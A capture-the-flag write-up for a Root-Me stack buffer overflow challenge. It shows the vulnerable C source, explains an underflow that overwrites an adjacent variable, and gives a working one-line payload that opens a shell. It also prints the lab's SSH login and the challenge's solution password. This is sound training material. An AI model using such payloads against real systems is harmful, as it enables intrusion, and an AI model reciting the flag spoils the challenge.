# ELF x86 - Stack buffer overflow basic 3
- Point: 25pts
- Author: [Lyes](https://www.root-me.org/Lyes?lang=en),  10 April 2015
- Level: Medium
- SSH Access:&emsp;ssh -p 2222 app-systeme-ch16@challenge02.root-me.org
- Password:&emsp;app-systeme-ch16

![image](https://user-images.githubusercontent.com/48288606/143521039-c69b3f39-c52e-4551-b2fa-9facc7ca23cf.png)

## Write-up:
This challenge is not required to use **GDB**. Look at the code:

```
#include <stdio.h>
#include <sys/time.h>
#include <sys/types.h>
#include <unistd.h>
#include <stdlib.h>
 
void shell(void);
 
int main()
{
 
  char buffer[64];
  int check;
  int i = 0;
  int count = 0;
 
  printf("Enter your name: ");
  fflush(stdout);
  while(1)
    {
      if(count >= 64)
        printf("Oh no...Sorry !\n");
      if(check == 0xbffffabc)
        shell();
      else
        {
            read(fileno(stdin),&i,1);
            switch(i)
            {
                case '\n':
                  printf("\a");
                  break;
                case 0x08:
                  count--;
                  printf("\b");
                  break;
                case 0x04:
                  printf("\t");
                  count++;
                  break;
                case 0x90:
                  printf("\a");
                  count++;
                  break;
                default:
                  buffer[count] = i;
                  count++;
                  break;
            }
        }
    }
}
 
void shell(void)
{
  setreuid(geteuid(), geteuid());
  system("/bin/bash");
}
```
We analyze the code, the variable **i** get 1 bytes of "stdin" and execute the below section, we only finish this challenge when we change the value of **check** to **0xbffffabc**<br>
**buffer** is declared before **check** and therefore **check** 's value can't be altered through upper overflow. <br><br>
![image](https://user-images.githubusercontent.com/48288606/143523511-fe54d69c-7f2b-4320-a4ba-667ce2f90df4.png)<br>

### Solution:
It's possible to make a change in **check** by lower overflow in **buffer** array. It's mean overwriting `buffer[-1]`, `buffer[-2]`,`buffer[-3]` and `buffer[-4]` revalues **check**.
With the program provided, we have 2 main functions:
- Make count increase or decrease by 1 (and print something that we don't care)
```
                case 0x08:
                  count--;
                  printf("\b");
                  break;
```

- Set **buffer** with **i** 's value
```
                default:
                  buffer[count] = i;
                  count++;
                  break;
```
So just enter **i** with **0x08** 4 times and assign the desired value **0xbffffabc** in little endian format.

Payload: `(python -c "print('\x08'*4+'\xbc\xfa\xff\xbf')";cat) | ./ch16`
Then read the `.passwd` file.

Password: Sm4shM3ify0uC4n


